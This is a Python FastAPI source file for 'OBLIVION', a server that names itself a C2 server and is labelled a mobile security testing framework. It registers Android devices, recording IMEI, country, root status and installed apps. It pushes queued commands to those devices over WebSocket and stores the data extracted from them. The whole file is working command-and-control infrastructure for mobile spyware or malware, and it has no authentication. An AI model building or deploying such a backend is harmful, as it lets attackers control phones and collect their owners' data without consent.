# OBLIVION - Advanced Mobile Security Testing Framework
# Backend Server - FastAPI + WebSocket

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
import json
import sqlite3
import asyncio
from datetime import datetime
from typing import Dict, List, Optional
import uuid
import logging

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Initialize FastAPI
app = FastAPI(
    title="OBLIVION C2 Server",
    description="Advanced Mobile Security Testing Framework",
    version="1.0.0"
)

# CORS configuration
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ============================================
# DATABASE SETUP
# ============================================

def init_database():
    """Initialize SQLite database with all tables"""
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    
    # Devices table
    c.execute('''
        CREATE TABLE IF NOT EXISTS devices (
            id TEXT PRIMARY KEY,
            device_name TEXT,
            device_model TEXT,
            manufacturer TEXT,
            android_version TEXT,
            security_patch TEXT,
            imei TEXT,
            country TEXT,
            first_seen TEXT,
            last_seen TEXT,
            status TEXT DEFAULT 'active',
            root_status TEXT,
            installed_apps TEXT
        )
    ''')
    
    # Commands table
    c.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            command_type TEXT,
            parameters TEXT,
            status TEXT DEFAULT 'pending',
            created_at TEXT,
            executed_at TEXT,
            result TEXT,
            FOREIGN KEY (device_id) REFERENCES devices (id)
        )
    ''')
    
    # Extracted data table
    c.execute('''
        CREATE TABLE IF NOT EXISTS extracted_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            data_type TEXT,
            data_content TEXT,
            timestamp TEXT,
            file_path TEXT,
            FOREIGN KEY (device_id) REFERENCES devices (id)
        )
    ''')
    
    # Alerts table
    c.execute('''
        CREATE TABLE IF NOT EXISTS alerts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id TEXT,
            alert_type TEXT,
            severity TEXT,
            details TEXT,
            timestamp TEXT,
            resolved BOOLEAN DEFAULT 0,
            FOREIGN KEY (device_id) REFERENCES devices (id)
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("Database initialized successfully")

# ============================================
# WEBSOCKET CONNECTION MANAGER
# ============================================

class ConnectionManager:
    def __init__(self):
        self.active_connections: Dict[str, WebSocket] = {}
        self.device_connections: Dict[str, str] = {}  # device_id -> connection_id
    
    async def connect(self, websocket: WebSocket, device_id: str = None):
        await websocket.accept()
        connection_id = str(uuid.uuid4())
        self.active_connections[connection_id] = websocket
        
        if device_id:
            self.device_connections[device_id] = connection_id
            logger.info(f"Device {device_id} connected (ID: {connection_id})")
        
        return connection_id
    
    def disconnect(self, connection_id: str):
        if connection_id in self.active_connections:
            del self.active_connections[connection_id]
        
        # Remove from device mapping
        for device_id, conn_id in list(self.device_connections.items()):
            if conn_id == connection_id:
                del self.device_connections[device_id]
                logger.info(f"Device {device_id} disconnected")
                break
    
    async def send_to_device(self, device_id: str, message: dict):
        """Send command to specific device"""
        if device_id in self.device_connections:
            connection_id = self.device_connections[device_id]
            if connection_id in self.active_connections:
                await self.active_connections[connection_id].send_json(message)
                return True
        return False
    
    async def broadcast(self, message: dict):
        """Broadcast to all connected clients"""
        for connection in self.active_connections.values():
            try:
                await connection.send_json(message)
            except:
                pass
    
    def get_connected_devices(self):
        """Get list of connected device IDs"""
        return list(self.device_connections.keys())

manager = ConnectionManager()

# ============================================
# API ENDPOINTS
# ============================================

@app.on_event("startup")
async def startup_event():
    init_database()
    logger.info("OBLIVION Server started successfully!")

@app.get("/")
async def root():
    return {
        "status": "online",
        "server": "OBLIVION C2",
        "version": "1.0.0",
        "timestamp": datetime.now().isoformat()
    }

@app.get("/api/devices")
async def get_devices():
    """Get list of all registered devices"""
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    c.execute('SELECT * FROM devices ORDER BY last_seen DESC')
    devices = []
    for row in c.fetchall():
        devices.append({
            "id": row[0],
            "device_name": row[1],
            "device_model": row[2],
            "manufacturer": row[3],
            "android_version": row[4],
            "security_patch": row[5],
            "imei": row[6],
            "country": row[7],
            "first_seen": row[8],
            "last_seen": row[9],
            "status": row[10],
            "root_status": row[11],
            "installed_apps": row[12]
        })
    conn.close()
    return {"devices": devices}

@app.get("/api/devices/{device_id}")
async def get_device(device_id: str):
    """Get specific device details"""
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    c.execute('SELECT * FROM devices WHERE id = ?', (device_id,))
    row = c.fetchone()
    conn.close()
    
    if not row:
        raise HTTPException(status_code=404, detail="Device not found")
    
    return {
        "id": row[0],
        "device_name": row[1],
        "device_model": row[2],
        "manufacturer": row[3],
        "android_version": row[4],
        "security_patch": row[5],
        "imei": row[6],
        "country": row[7],
        "first_seen": row[8],
        "last_seen": row[9],
        "status": row[10],
        "root_status": row[11],
        "installed_apps": row[12],
        "is_online": device_id in manager.get_connected_devices()
    }

@app.post("/api/devices/register")
async def register_device(device_data: dict):
    """Register a new device"""
    device_id = device_data.get('id', str(uuid.uuid4()))
    
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    
    c.execute('''
        INSERT OR REPLACE INTO devices 
        (id, device_name, device_model, manufacturer, android_version, 
         security_patch, imei, country, first_seen, last_seen, status, 
         root_status, installed_apps)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (
        device_id,
        device_data.get('device_name', 'Unknown'),
        device_data.get('device_model', 'Unknown'),
        device_data.get('manufacturer', 'Unknown'),
        device_data.get('android_version', 'Unknown'),
        device_data.get('security_patch', 'Unknown'),
        device_data.get('imei', 'Unknown'),
        device_data.get('country', 'Unknown'),
        datetime.now().isoformat(),
        datetime.now().isoformat(),
        'active',
        device_data.get('root_status', 'false'),
        json.dumps(device_data.get('installed_apps', []))
    ))
    
    conn.commit()
    conn.close()
    
    await manager.broadcast({
        "type": "device_registered",
        "device_id": device_id,
        "timestamp": datetime.now().isoformat()
    })
    
    return {"status": "registered", "device_id": device_id}

@app.post("/api/commands")
async def send_command(command_data: dict):
    """Send command to a device"""
    device_id = command_data.get('device_id')
    command_type = command_data.get('command_type')
    parameters = command_data.get('parameters', {})
    
    if not device_id or not command_type:
        raise HTTPException(status_code=400, detail="device_id and command_type required")
    
    # Store command
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO commands (device_id, command_type, parameters, created_at, status)
        VALUES (?, ?, ?, ?, ?)
    ''', (
        device_id,
        command_type,
        json.dumps(parameters),
        datetime.now().isoformat(),
        'pending'
    ))
    command_id = c.lastrowid
    conn.commit()
    conn.close()
    
    # Send to device if online
    sent = await manager.send_to_device(device_id, {
        "command_id": command_id,
        "command_type": command_type,
        "parameters": parameters,
        "timestamp": datetime.now().isoformat()
    })
    
    return {
        "status": "sent" if sent else "queued",
        "command_id": command_id,
        "device_online": sent
    }

@app.get("/api/commands/{device_id}")
async def get_commands(device_id: str, status: Optional[str] = None):
    """Get commands for a device"""
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    
    query = 'SELECT * FROM commands WHERE device_id = ?'
    params = [device_id]
    
    if status:
        query += ' AND status = ?'
        params.append(status)
    
    query += ' ORDER BY created_at DESC'
    
    c.execute(query, params)
    commands = []
    for row in c.fetchall():
        commands.append({
            "id": row[0],
            "device_id": row[1],
            "command_type": row[2],
            "parameters": json.loads(row[3]),
            "status": row[4],
            "created_at": row[5],
            "executed_at": row[6],
            "result": row[7]
        })
    conn.close()
    return {"commands": commands}

@app.post("/api/commands/{command_id}/result")
async def update_command_result(command_id: int, result_data: dict):
    """Update command execution result"""
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    c.execute('''
        UPDATE commands 
        SET status = ?, executed_at = ?, result = ?
        WHERE id = ?
    ''', (
        result_data.get('status', 'completed'),
        datetime.now().isoformat(),
        json.dumps(result_data.get('result', {})),
        command_id
    ))
    conn.commit()
    conn.close()
    
    await manager.broadcast({
        "type": "command_result",
        "command_id": command_id,
        "status": result_data.get('status'),
        "timestamp": datetime.now().isoformat()
    })
    
    return {"status": "updated"}

@app.post("/api/data")
async def store_extracted_data(data: dict):
    """Store extracted data from device"""
    device_id = data.get('device_id')
    data_type = data.get('data_type')
    data_content = data.get('data_content')
    file_path = data.get('file_path')
    
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO extracted_data (device_id, data_type, data_content, timestamp, file_path)
        VALUES (?, ?, ?, ?, ?)
    ''', (
        device_id,
        data_type,
        json.dumps(data_content),
        datetime.now().isoformat(),
        file_path
    ))
    conn.commit()
    conn.close()
    
    await manager.broadcast({
        "type": "data_extracted",
        "device_id": device_id,
        "data_type": data_type,
        "size": len(json.dumps(data_content)),
        "timestamp": datetime.now().isoformat()
    })
    
    return {"status": "stored"}

@app.get("/api/stats")
async def get_stats():
    """Get system statistics"""
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    
    c.execute('SELECT COUNT(*) FROM devices')
    total_devices = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM devices WHERE status = "active"')
    active_devices = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM commands WHERE status = "pending"')
    pending_commands = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM commands')
    total_commands = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM extracted_data')
    total_data = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM alerts WHERE resolved = 0')
    active_alerts = c.fetchone()[0]
    
    conn.close()
    
    return {
        "total_devices": total_devices,
        "active_devices": active_devices,
        "online_devices": len(manager.get_connected_devices()),
        "pending_commands": pending_commands,
        "total_commands": total_commands,
        "total_data_extracted": total_data,
        "active_alerts": active_alerts,
        "timestamp": datetime.now().isoformat()
    }

@app.get("/api/alerts")
async def get_alerts(resolved: Optional[bool] = None):
    """Get alerts"""
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    
    query = 'SELECT * FROM alerts'
    params = []
    
    if resolved is not None:
        query += ' WHERE resolved = ?'
        params.append(1 if resolved else 0)
    
    query += ' ORDER BY timestamp DESC LIMIT 100'
    
    c.execute(query, params)
    alerts = []
    for row in c.fetchall():
        alerts.append({
            "id": row[0],
            "device_id": row[1],
            "alert_type": row[2],
            "severity": row[3],
            "details": row[4],
            "timestamp": row[5],
            "resolved": bool(row[6])
        })
    conn.close()
    return {"alerts": alerts}

@app.post("/api/alerts")
async def create_alert(alert_data: dict):
    """Create a new alert"""
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    c.execute('''
        INSERT INTO alerts (device_id, alert_type, severity, details, timestamp)
        VALUES (?, ?, ?, ?, ?)
    ''', (
        alert_data.get('device_id', 'system'),
        alert_data.get('alert_type', 'unknown'),
        alert_data.get('severity', 'medium'),
        alert_data.get('details', ''),
        datetime.now().isoformat()
    ))
    alert_id = c.lastrowid
    conn.commit()
    conn.close()
    
    await manager.broadcast({
        "type": "alert",
        "alert_id": alert_id,
        "severity": alert_data.get('severity'),
        "details": alert_data.get('details'),
        "timestamp": datetime.now().isoformat()
    })
    
    return {"status": "created", "alert_id": alert_id}

@app.put("/api/alerts/{alert_id}/resolve")
async def resolve_alert(alert_id: int):
    """Resolve an alert"""
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    c.execute('UPDATE alerts SET resolved = 1 WHERE id = ?', (alert_id,))
    conn.commit()
    conn.close()
    return {"status": "resolved"}

# ============================================
# WEBSOCKET ENDPOINT
# ============================================

@app.websocket("/ws/{device_id}")
async def websocket_endpoint(websocket: WebSocket, device_id: str):
    connection_id = await manager.connect(websocket, device_id)
    
    # Register device if not exists
    conn = sqlite3.connect('OBLIVION.db')
    c = conn.cursor()
    c.execute('SELECT id FROM devices WHERE id = ?', (device_id,))
    if not c.fetchone():
        c.execute('''
            INSERT INTO devices (id, device_name, status, first_seen, last_seen)
            VALUES (?, ?, ?, ?, ?)
        ''', (device_id, f"Device_{device_id[:8]}", 'active', 
              datetime.now().isoformat(), datetime.now().isoformat()))
        conn.commit()
    conn.close()
    
    try:
        while True:
            data = await websocket.receive_json()
            
            # Handle different message types
            msg_type = data.get('type', 'unknown')
            
            if msg_type == 'heartbeat':
                # Update device last_seen
                conn = sqlite3.connect('OBLIVION.db')
                c = conn.cursor()
                c.execute('UPDATE devices SET last_seen = ?, status = "active" WHERE id = ?',
                         (datetime.now().isoformat(), device_id))
                conn.commit()
                conn.close()
                
                await websocket.send_json({
                    "type": "heartbeat_ack",
                    "timestamp": datetime.now().isoformat()
                })
            
            elif msg_type == 'data':
                # Store extracted data
                await store_extracted_data({
                    'device_id': device_id,
                    'data_type': data.get('data_type'),
                    'data_content': data.get('content'),
                    'file_path': data.get('file_path')
                })
            
            elif msg_type == 'command_result':
                # Update command result
                await update_command_result(
                    data.get('command_id'),
                    {
                        'status': data.get('status'),
                        'result': data.get('result')
                    }
                )
            
            elif msg_type == 'registration':
                # Complete device registration
                await register_device({
                    'id': device_id,
                    **data.get('device_info', {})
                })
            
            elif msg_type == 'alert':
                # Forward alert
                await create_alert({
                    'device_id': device_id,
                    'alert_type': data.get('alert_type'),
                    'severity': data.get('severity'),
                    'details': data.get('details')
                })
            
            # Broadcast to dashboard
            await manager.broadcast({
                "type": "device_message",
                "device_id": device_id,
                "message": data,
                "timestamp": datetime.now().isoformat()
            })
            
    except WebSocketDisconnect:
        manager.disconnect(connection_id)
        logger.info(f"Device {device_id} disconnected")

# ============================================
# START SERVER
# ============================================

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="0.0.0.0",
        port=8000,
        log_level="info"
    )